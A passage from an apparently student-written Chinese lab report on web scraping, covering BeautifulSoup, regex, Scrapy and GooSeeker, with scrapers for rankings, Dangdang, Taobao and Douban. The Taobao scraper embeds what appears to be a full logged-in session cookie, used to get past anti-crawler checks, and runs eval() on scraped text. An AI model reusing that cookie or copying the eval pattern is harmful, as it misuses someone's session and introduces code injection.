<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_3_2</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">'http://www.zuihaodaxue.cn/ARWU2016.html'</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(tr, bs4.element.Tag):</span><br><span class="line">            tds = tr(<span class="string">'td'</span>)</span><br><span class="line">            uinfo.append([tds[<span class="number">0</span>].string, tds[<span class="number">1</span>].a.string, tds[<span class="number">3</span>].string])</span><br><span class="line">    tplt = <span class="string">"&#123;0:^4&#125;\t&#123;1:&#123;3&#125;^12&#125;\t&#123;2:^10&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>, chr(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        u = uinfo[i]</span><br><span class="line">        print(tplt.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], chr(<span class="number">12288</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_3_2()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402170840117.png" alt="image-20200402170840117"></p>
<h2 id="3-爬取当当图书排行榜（榜单自选）"><a href="#3-爬取当当图书排行榜（榜单自选）" class="headerlink" title="3.爬取当当图书排行榜（榜单自选）"></a>3.爬取当当图书排行榜（榜单自选）</h2><p>格式：爬取结果包含但不限于[排名 书名 作者]， 注意输出格式对齐。</p>
<p>我这里爬取 <code>信息安全</code>类书籍的销量排行榜</p>
<p><a href="http://bang.dangdang.com/books/bestsellers/01.54.19.00.00.00-24hours-0-0-1-1" target="_blank" rel="noopener">http://bang.dangdang.com/books/bestsellers/01.54.19.00.00.00-24hours-0-0-1-1</a></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402171057952.png" alt="image-20200402171057952"></p>
<p>可以看到<code>html</code>结构如下</p>
<p>先从<code>class</code>为<code>bang_list clearfix bang_list_mode</code>中的<code>ul</code>遍历<code>li</code></p>
<p>再从<code>li</code>中找出</p>
<ul>
<li>排名</li>
<li>名字</li>
<li>现在的价格</li>
<li>之前的价格</li>
<li>链接</li>
</ul>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402171331034.png" alt="image-20200402171331034"></p>
<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_4</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">'http://bang.dangdang.com/books/bestsellers/01.54.19.00.00.00-24hours-0-0-1-1'</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="comment"># print(soup.prettify())</span></span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> soup.find(<span class="string">'ul'</span>,attrs=&#123;<span class="string">"class"</span>:re.compile(<span class="string">'bang_list clearfix bang_list_mode'</span>)&#125;).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(li, bs4.element.Tag):</span><br><span class="line">            div_array = li(<span class="string">'div'</span>)</span><br><span class="line">            rank=div_array[<span class="number">0</span>].string</span><br><span class="line">            name=div_array[<span class="number">1</span>].a.img.attrs[<span class="string">'title'</span>]</span><br><span class="line">            price_n=div_array[<span class="number">6</span>].p.contents[<span class="number">1</span>].string</span><br><span class="line">            prince_before=div_array[<span class="number">6</span>].p.contents[<span class="number">3</span>].string</span><br><span class="line">            url=div_array[<span class="number">1</span>].a.attrs[<span class="string">'href'</span>]</span><br><span class="line">            uinfo.append([rank,name,price_n,prince_before,url])</span><br><span class="line">    tplt = <span class="string">"&#123;0:^3&#125;\t&#123;1:&#123;5&#125;^15&#125;\t&#123;2:^5&#125;\t&#123;3:^5&#125;\t&#123;4:^10&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"排名"</span>, <span class="string">"书名"</span>, <span class="string">"之前的价格"</span>,<span class="string">"当前价格"</span>,<span class="string">"URL"</span>, chr(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        u = uinfo[i]</span><br><span class="line">        print(tplt.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>],u[<span class="number">3</span>],u[<span class="number">4</span>],chr(<span class="number">12288</span>)))</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    instance_4()</span><br></pre></td></tr></table></figure>

<p>结果如下！！！</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402175720833.png" alt="image-20200402175720833"></p>
<h1 id="实验2-1-正则式"><a href="#实验2-1-正则式" class="headerlink" title="实验2.1-正则式"></a>实验2.1-正则式</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>正则表达式（Regular Expression，简写为regex或RE），使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402184401030.png" alt="image-20200402184401030"></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402200458302.png" alt="image-20200402200458302"></p>
<p>re库主要的方法如下</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402204550930.png" alt="image-20200402204550930"></p>
<p>match对象包含了关于此次匹配的信息，可以使用Match提供的可读属性或方法来获取这些信息。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402204649960.png" alt="image-20200402204649960"></p>
<p>只要长度输出可能不同的，都可以通过在操作符后增加?变成最小匹配</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402204939305.png" alt="image-20200402204939305"></p>
<h2 id="尝试爬取淘宝商品的数据"><a href="#尝试爬取淘宝商品的数据" class="headerlink" title="尝试爬取淘宝商品的数据"></a>尝试爬取淘宝商品的数据</h2><ul>
<li><p>扫码登陆淘宝</p>
</li>
<li><p>搜索某个商品</p>
</li>
<li><p>发现商品分页的规律——如下，</p>
<p>第1页<code>https://s.taobao.com/search</code> <code>?q=airpodspro</code> <code>&amp;s=0</code></p>
<p>第2页<code>https://s.taobao.com/search</code> <code>?q=airpodspro</code> <code>&amp;s=44</code></p>
<p>第3页<code>https://s.taobao.com/search</code> <code>?q=airpodspro</code> <code>&amp;s=88</code></p>
<p>可以看出每页的s都是44累加的，这样我们想要遍历分页只需要遍历s即可</p>
</li>
</ul>
<p>由于淘宝有反爬虫机制，我们要将手动登陆后的Cookies、agent复制到header中</p>
<ul>
<li>扫码登陆淘宝</li>
<li>搜索商品，Chrome  下 F12打开审查</li>
<li>点击Network-&gt;Doc类型-&gt;search……-&gt;复制cookie、user-agent</li>
<li>将cookie、user-agent放到请求中，具体方式看代码</li>
</ul>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402215404788.png" alt="image-20200402215404788"></p>
<p>编写程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># AFAEF728105FFA95263125A9E0A097DC</span></span><br><span class="line">        hd = &#123;<span class="string">'cookie'</span>: <span class="string">'t=31555440a71b4d3ae330f044081146f9; cna=eaagFpxdLAUCAdrFmScIIYcw; thw=cn; cookie2=1bdfd953450db1890a4960bafedf8169; v=0; _tb_token_=eefe396e49733; _samesite_flag_=true; sgcookie=Edo1lgxwoK2bRfYVahZOe; unb=2522367083; uc3=lg2=UIHiLt3xD8xYTw%3D%3D&amp;id2=UU2w7Hb9dvcsIQ%3D%3D&amp;nk2=tw%2F9XZuWLTE%3D&amp;vt3=F8dBxdAW4LSdjQGNkyg%3D; csg=dbe09bde; lgc=%5Cu518D%5Cu89C1%5Cu795E%5Cu5947; cookie17=UU2w7Hb9dvcsIQ%3D%3D; dnk=%5Cu518D%5Cu89C1%5Cu795E%5Cu5947; skt=d262960506d154ef; existShop=MTU4NTgzMjY2OQ%3D%3D; uc4=nk4=0%40tXwweg7zi7bxIxNwomsc8lmKSw%3D%3D&amp;id4=0%40U2%2F32UM%2BC1YLt9wuKmGuJsNzMVo7; tracknick=%5Cu518D%5Cu89C1%5Cu795E%5Cu5947; _cc_=VT5L2FSpdA%3D%3D; _l_g_=Ug%3D%3D; sg=%E5%A5%873f; _nk_=%5Cu518D%5Cu89C1%5Cu795E%5Cu5947; cookie1=AHnU1YHbYbkYLGQxilkANOpn3Y133DLACku%2BjBXRjNk%3D; enc=q3Gwz15Bq6QwoLkeceXsesqtD8wfeR5rLdWz%2BffQweZA9DT9jrnDbu8nmeCLcdc0X%2BE9JypMae6noiYZzph68g%3D%3D; tfstk=cEPhBo_vJJkCDiI_-HGQy2BO73GhalBEA7Pa_WoWKw4ovdFZ8sDJQKWBJNmLx7p5.; mt=ci=113_1; uc1=cookie16=URm48syIJ1yk0MX2J7mAAEhTuw%3D%3D&amp;cookie21=VFC%2FuZ9aiKCaj7AzMHh1&amp;cookie15=Vq8l%2BKCLz3%2F65A%3D%3D&amp;existShop=false&amp;pas=0&amp;cookie14=UoTUP2oWHktHHQ%3D%3D; l=dBEymxamQbBz3b0YBOfgqDezDdbOXBRflsPr9GLh3IB19u53HdBqEHweIlleI3QQEt134eKrjGibiRQeC3fRwxDDB3h2q_5xnxf..; isg=BIOD_uxF2W-mR5UgKRuxH2xxEkct-Bc6Bw5VXrVg3-JZdKOWPcinimHi7gQ6VG8y'</span></span><br><span class="line">              ,<span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0'</span>&#125;</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">30</span>,headers=hd)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parsePage</span><span class="params">(ilt, html)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plt = re.findall(<span class="string">r'\"view_price\"\:\"[\d\.]*\"'</span>, html) <span class="comment">#匹配价格</span></span><br><span class="line">        tlt = re.findall(<span class="string">r'\"raw_title\"\:\".*?\"'</span>, html)  <span class="comment">#匹配标题</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plt)):</span><br><span class="line">            price = eval(plt[i].split(<span class="string">':'</span>)[<span class="number">1</span>])  <span class="comment">#对搜索结果进行分割，以“：”为分割点</span></span><br><span class="line">            title = eval(tlt[i].split(<span class="string">':'</span>)[<span class="number">1</span>])  <span class="comment">#eval将字符串当成有效的表达式来求值并返回计算结果</span></span><br><span class="line">            ilt.append([price, title])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printGoodsList</span><span class="params">(ilt)</span>:</span></span><br><span class="line">    tplt = <span class="string">"&#123;:4&#125;\t&#123;:8&#125;\t&#123;:16&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"序号"</span>, <span class="string">"价格"</span>, <span class="string">"商品名称"</span>))</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> ilt:</span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="comment"># print((tplt.format(count, g[0], g[1])+"\n"))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"taobao-airpods pro.txt"</span>, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write((tplt.format(count, g[<span class="number">0</span>], g[<span class="number">1</span>])+<span class="string">"\n"</span>)) <span class="comment"># 这句话自带文件关闭功能，不需要再写f.close()</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    goods = <span class="string">'airpodspro'</span></span><br><span class="line">    depth = <span class="number">100</span></span><br><span class="line">    start_url = <span class="string">'https://s.taobao.com/search?q='</span> + goods</span><br><span class="line">    infoList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(depth):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = start_url + <span class="string">'&amp;s='</span> + str(<span class="number">44</span> * i)</span><br><span class="line">            html = getHTMLText(url)</span><br><span class="line">            <span class="comment"># print(html)</span></span><br><span class="line">            parsePage(infoList, html)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    printGoodsList(infoList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>功能说明：</p>
<ul>
<li><code>main()</code>主程序用于遍历商品页输出</li>
<li><code>getHTMLText()</code>用于获得html</li>
<li><code>parsePage()</code>用正则式搜索商品名称和价格</li>
<li><code>printGoodsList()</code> 用于向命令行输出</li>
</ul>
<p>这里写入txt——用python向txt文件中写数据时的追加和覆盖，我们使用a+</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"test.txt"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">"这是个测试！"</span>) <span class="comment">#这句话自带文件关闭功能，不需要再写f.close()</span></span><br><span class="line">r：以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</span><br><span class="line">r+：打开一个文件用于读写。文件指针将会放在文件的开头。 </span><br><span class="line">w：打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</span><br><span class="line">w+：打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</span><br><span class="line">a：打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</span><br><span class="line">a+：打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</span><br></pre></td></tr></table></figure>

<p>我爬取的是airpodspro的相关信息，爬取100页，具体的数据会存储到txt中</p>
<p>运行程序，成功</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402213933616.png" alt="image-20200402213933616"></p>
<p>爬取的过程中出现了编码问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">UnicodeEncodeError: <span class="string">'gbk'</span> codec can<span class="string">'t encode character '</span>\xae<span class="string">' in position 17: illegal multibyte sequence</span></span><br></pre></td></tr></table></figure>

<p>处理一下exception就好了</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402222101748.png" alt="image-20200402222101748"></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402223510719.png" alt="image-20200402223510719"></p>
<h1 id="实验2-2-用srapy框架爬取任意网站的内容"><a href="#实验2-2-用srapy框架爬取任意网站的内容" class="headerlink" title="实验2.2-用srapy框架爬取任意网站的内容"></a>实验2.2-用srapy框架爬取任意网站的内容</h1><p>要求：（不少于50条）</p>
<h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><h3 id="1-Scrapy与request"><a href="#1-Scrapy与request" class="headerlink" title="1.Scrapy与request"></a>1.Scrapy与request</h3><ul>
<li>相同点：两者都可以进行页面请求和爬取，Python爬虫的两个重要技术路线两者可用性都好，文档丰富，入门简单两者都没有处理js、提交表单、应对验证码等功能（可扩展）</li>
<li>不同点：<ul>
<li>Requests 页面级爬虫，功能库，并发性考虑不足，性能较差，重点在于页面下载。定制灵活，上手十分简单 。</li>
<li>Scrapy<br>网站级爬虫 框架，并发性好，性能较高， 重点在于爬虫结构。 一般定制灵活，深度定制困难， 入门稍难。</li>
</ul>
</li>
</ul>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402222443363.png" alt="image-20200402222443363"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Engine从Spider处获得爬取请求(Request)</span><br><span class="line">Engine将爬取请求转发给Scheduler，用于调度</span><br><span class="line">Engine从Scheduler处获得下一个要爬取的请求</span><br><span class="line">Engine将爬取请求通过中间件发送给Downloader</span><br><span class="line">爬取网页后，Downloader形成响应（Response）通过中间件发给Engine</span><br><span class="line">Engine将收到的响应通过中间件发送给Spider处理 </span><br><span class="line">Spider处理响应后产生爬取项（scraped Item）和新的爬取请求（Requests）给Engine</span><br><span class="line">Engine将爬取项发送给Item Pipeline（框架出口）</span><br><span class="line">Engine将爬取请求发送给Scheduler</span><br></pre></td></tr></table></figure>

<h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><ul>
<li><p>安装lxml： pip install lxml</p>
</li>
<li><p>下载对应版本的Twisted</p>
<p>我下面的方法没成功，是在pycharm下下载的</p>
<p>%%%%%%%%%%%%%%%%%%%%</p>
<p>++++++++++++++++++++++++</p>
<p>​       <a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted" target="_blank" rel="noopener">http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted</a> </p>
<p>​        <img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402222827956.png" alt="image-20200402222827956"></p>
<p>​       pip3 install C:\Users\78290\Desktop\Twisted-20.3.0-cp38-cp38-win_amd64.whl</p>
<p>​        (下载好的twisted模块的whl文件路径)</p>
<p>​    %%%%%%%%%%%%%%%%%%</p>
</li>
<li><p>安装scrapy：pip install scrapy</p>
</li>
<li><p>安装关联模块pypiwin32：pip install pypiwin32 </p>
</li>
</ul>
<h3 id="3-创建一个scrapy"><a href="#3-创建一个scrapy" class="headerlink" title="3.创建一个scrapy"></a>3.创建一个scrapy</h3><p>Scrapy常用命令</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402224714359.png" alt="image-20200402224714359"></p>
<p>1.创建项目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scrapy startproject tutorial</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402225249765.png" alt="image-20200402225249765"></p>
<p>2.定义Item</p>
<p>编辑 tutorial 目录中的 items.py 文件:</p>
<p>3.编写spider </p>
<p>Spider是用户编写用于从单个网站(或者一些网站)爬取数据的类。其包含了一个用于下载的初始URL，如何跟进网页中的链接以及如何分析页面中的内容， 提取生成 item 的方法。<br>为了创建一个Spider，必须继承 scrapy.Spider 类， 且定义三个属性：</p>
<ul>
<li>name: 用于区别Spider。 该名字必须是唯一的，不可以为不同的Spider设定相同的名字。</li>
<li>start_urls: 包含了Spider在启动时进行爬取的url列表。 因此，第一个被获取到的页面将是其中之一。 后续的URL则从初始的URL获取到的数据中提取。</li>
<li>parse() 是spider的一个方法。 被调用时，每个初始URL完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。 该方法负责解析返回的数据(response data)，提取数据(生成item)以及生成需要进一步处理的URL的 Request 对象。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在项目中生成 spider 文件的两种方法:</span><br><span class="line">命令行输入 Scrapy genspider domain domain.com</span><br><span class="line">tutorial&#x2F;spiders&#x2F;目录下创建domain.py</span><br></pre></td></tr></table></figure>

<p>4.执行spider</p>
<p>进入项目的根目录，执行下列命令启动spider    </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">scrapy crawl w3school</span><br></pre></td></tr></table></figure>

<p>5.提取item</p>
<p>scrapy支持如下库</p>
<ul>
<li>Beautiful Soup</li>
<li>Lxml</li>
<li>Re</li>
<li>Xpath</li>
<li>CSS</li>
</ul>
<h2 id="豆瓣电影-top250"><a href="#豆瓣电影-top250" class="headerlink" title="豆瓣电影 top250"></a>豆瓣电影 top250</h2><p>创建项目</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scrapy genspider douban_movie &quot;douban_movie.com&quot;</span><br></pre></td></tr></table></figure>

<p>进入spider新建spider</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd douban</span><br><span class="line">cd douban</span><br><span class="line">scrapy crawl douban_movie</span><br></pre></td></tr></table></figure>

<p>项目结构</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402235349247.png" alt="image-20200402235349247"></p>
<p>代码如下</p>
<p>douban_movie.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> douban.items <span class="keyword">import</span> DoubanItem</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanMovieSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">'douban_movie'</span></span><br><span class="line">    allowed_domains = [<span class="string">'movie.douban.com'</span>]</span><br><span class="line">    start_urls = [<span class="string">'https://movie.douban.com/j/chart/top_list?type=11&amp;interval_id=100%3A90&amp;action=&amp;start=0&amp;limit=20'</span>]</span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        item = DoubanItem()</span><br><span class="line">        content_list = json.loads(response.body.decode())</span><br><span class="line">        <span class="keyword">if</span> (content_list == []):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">            item[<span class="string">'title'</span>] = content[<span class="string">'title'</span>]</span><br><span class="line">            item[<span class="string">'url'</span>] = content[<span class="string">'url'</span>]</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">        self.offset += <span class="number">20</span> <span class="comment">#拼接分页请求链接</span></span><br><span class="line">        url = <span class="string">'https://movie.douban.com/j/chart/top_list?type=11&amp;interval_id=100%3A90&amp;action=&amp;start='</span>+str(self.offset) + <span class="string">'&amp;limit=20'</span></span><br><span class="line">        <span class="keyword">yield</span> scrapy.Request(url=url,callback=self.parse)</span><br></pre></td></tr></table></figure>

<p>items.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    url = scrapy.Field()</span><br></pre></td></tr></table></figure>

<p>pipelines.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanPipeline</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span><span class="params">(self,spider)</span>:</span></span><br><span class="line">        self.file = open(<span class="string">"douban.json"</span>,<span class="string">"w"</span>)</span><br><span class="line">        self.num = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line">        self.num+=<span class="number">1</span></span><br><span class="line">        content = json.dumps(dict(item),ensure_ascii=<span class="literal">False</span>)+<span class="string">'\n'</span></span><br><span class="line">        self.file.write(content)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span><span class="params">(self,spider)</span>:</span></span><br><span class="line">        print(<span class="string">'一共保存了'</span>+str(self.num)+<span class="string">'条数据'</span>)</span><br><span class="line">        self.file.close()</span><br></pre></td></tr></table></figure>

<p>setting.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BOT_NAME = <span class="string">'douban'</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">'douban.spiders'</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">'douban.spiders'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line">USER_AGENT = <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.15 Safari/537.36'</span></span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scrapy crawl douban_movie</span><br></pre></td></tr></table></figure>

<p>成功   保存为douban.json</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402235614155.png" alt="image-20200402235614155"></p>
<p>参考链接：</p>
<ol>
<li><p><a href="https://www.jianshu.com/p/ac9547e332da" target="_blank" rel="noopener">https://www.jianshu.com/p/ac9547e332da</a></p>
</li>
<li><p><a href="http://www.scrapyd.cn/" target="_blank" rel="noopener">scrapy中文网</a></p>
</li>
</ol>
<h1 id="实验3-使用GooSeeker爬取数据"><a href="#实验3-使用GooSeeker爬取数据" class="headerlink" title="实验3-使用GooSeeker爬取数据"></a>实验3-使用GooSeeker爬取数据</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p>​     GooSeeker是一个采用云计算架构的网页数据抽取工具包，能根据用户的指导，从网页上抓取需要的文本，并输出按一定结构输出提取结果文件（XML文件）</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403123135206.png" alt="image-20200403123135206"></p>
<h2 id="实例-知乎热榜爬取"><a href="#实例-知乎热榜爬取" class="headerlink" title="实例-知乎热榜爬取"></a>实例-知乎热榜爬取</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>​    首先从官方网站下载安装包，在主界面选择“下载爬虫”的下载方案比较方便。安装好软件后，新用户需要在集搜客网站上注册账号，用于之后登录集搜客软件。</p>
<h3 id="1-制作采集规则"><a href="#1-制作采集规则" class="headerlink" title="1.制作采集规则"></a>1.制作采集规则</h3><ol>
<li><p>打开MS谋数机</p>
</li>
<li><p>输入目标抓取网站的网址，命名规则主题名。</p>
</li>
</ol>
<p>第一步：在MS谋数机的“网址栏”，输入想要进行爬虫抓取的网页的网址，然后回车进行加载，可以在MS谋数机下方的“浏览器”窗口看到页面显示。</p>
<p>第二步：页面加载完后，在右边的“工作台”中的“命名主题”下方的“主题名”栏处输入自定义的主题名，这里我命名为“zhihu-rebang”，然后点击旁边的“查看”按钮，测试你起的名字是否已被占用，如果提示“该名可以使用”则命名成功。</p>
<h3 id="2-新建整理箱"><a href="#2-新建整理箱" class="headerlink" title="2.新建整理箱"></a>2.新建整理箱</h3><p>第一步：点击右方的“工作台”中的“创建规则”，点击“新建”按钮，在弹出的窗口中输入想要命名的整理箱名称。这里我命名为“rebang”。</p>
<p>第二步：在整理箱中添加抓取内容。右击整理箱名称选择“添加-包含”，这里我先添加“热榜名”，继续添加的话，右击“热榜名”选择“添加-其后”，添加“热榜简介”。</p>
<p>第三步：整理箱中必须有一个是“关键内容”，选择一个抓取内容设为“关键内容”，这里我吧“热榜名”勾选为“关键内容”。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403132103024.png" alt="image-20200403132103024"></p>
<h3 id="3-进行内容映射"><a href="#3-进行内容映射" class="headerlink" title="3.进行内容映射"></a>3.进行内容映射</h3><p>第一步：在“浏览器”窗口中点击想要获取的内容，比如现在要获取哪个内容，就在那个区域进行鼠标点击，这时候MS谋数台会自动定位其在HTML中结点的位置。</p>
<p>第二步：展开一个节点，因为“热榜名”是一个H2所以找到H2标签。</p>
<p>第三步：右击这个text，选择“内容映射-热榜名”。</p>
<p>第四步：后面的内容映射同第三步。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125234819.png" alt="image-20200403125234819"></p>
<h3 id="4-使用样例复制"><a href="#4-使用样例复制" class="headerlink" title="4.使用样例复制"></a>4.使用样例复制</h3><p>由于评论和评论之间是相同结构的数据，我们上一步只是完成了一个评论条目的抓取，想要抓取更多的评论就需要进行样例复制。</p>
<p>第一步：点击整理箱名称，即“rebang”。</p>
<p>第二步：勾选右侧方的“启用”，开启样例复制功能。</p>
<p>第三步：分别找到第一条热榜名和第二条热榜名对应的节点。</p>
